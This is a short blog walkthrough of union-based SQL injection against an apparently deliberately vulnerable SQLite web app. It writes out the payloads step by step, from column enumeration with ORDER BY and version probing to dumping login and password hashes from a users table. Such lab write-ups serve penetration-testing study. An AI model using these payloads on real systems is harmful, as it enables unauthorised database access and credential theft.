---
layout: post
title: SQL Injection (SQLite)
categories:
  - Web-Pentesting
---

<br>..

![118](https://teckk2.github.io/assets/images/Web%20Pentest/A1/118.png)
![119](https://teckk2.github.io/assets/images/Web%20Pentest/A1/119.png)
<br>If we try to get sql error with single quote then it will give us a very unusual error Error: HY000
<br>Start enumerating the columns using order by in the URL section,
![120](https://teckk2.github.io/assets/images/Web%20Pentest/A1/120.png)
![121](https://teckk2.github.io/assets/images/Web%20Pentest/A1/121.png)
<br>**title=iron' order by 1-- #&action=search**
<br>no error, it means we are on the right path
![122](https://teckk2.github.io/assets/images/Web%20Pentest/A1/122.png)
<br>At order by 7 I got the error, which means there are 6 columns
![123](https://teckk2.github.io/assets/images/Web%20Pentest/A1/123.png)
![124](https://teckk2.github.io/assets/images/Web%20Pentest/A1/124.png)
<br>**title=iron' union select 1,2,3,4,sqlite_version(),6-- #&action=search**
<br>Now let’s find the database tables.
![125](https://teckk2.github.io/assets/images/Web%20Pentest/A1/125.png)
![126](https://teckk2.github.io/assets/images/Web%20Pentest/A1/126.png)
<br>The above image showed the information needed; the login and password columns for the users table.
![127](https://teckk2.github.io/assets/images/Web%20Pentest/A1/127.png)
<br>**title=iron' union select 1,email,3,4,login||":"||password,6 from users-- #&action=search**
<br>SQLite uses **“||”** as the operator to concatenate strings together. In this case, we are joining the login and password with a colon.
<br>we dump the login:hash from the database.

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>



